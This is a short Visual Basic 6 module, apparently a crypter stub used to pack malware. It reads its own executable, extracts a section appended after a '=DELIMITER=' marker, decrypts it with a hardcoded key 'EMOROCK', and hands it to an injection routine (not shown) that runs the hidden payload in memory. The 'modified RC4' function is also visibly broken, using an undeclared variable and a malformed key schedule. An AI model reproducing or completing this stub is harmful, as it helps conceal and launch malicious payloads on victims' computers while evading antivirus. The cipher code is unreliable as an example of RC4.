Attribute VB_Name = "StubX"
Sub Main()


Dim MEX As String

MEX = App.Path & "\" & App.EXEName & ".exe"


Dim Data As String

Open MEX For Binary As #1 '

Data = Space(LOF(1)) '
Get #1, , Data
Close #1
Dim Delimiter() As String



Delimiter() = Split(Data, "=DELIMITER=")


Delimiter(1) = RC4(Delimiter(1), "EMOROCK")

Call Injec(MEX, StrConv(Delimiter(1), vbFromUnicode), vbNullString)


End Sub


Public Function RC4(ByVal Data As String, ByVal Password As String) As String ' This is a Modified RC4 Function ^^
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
    Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
    F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function
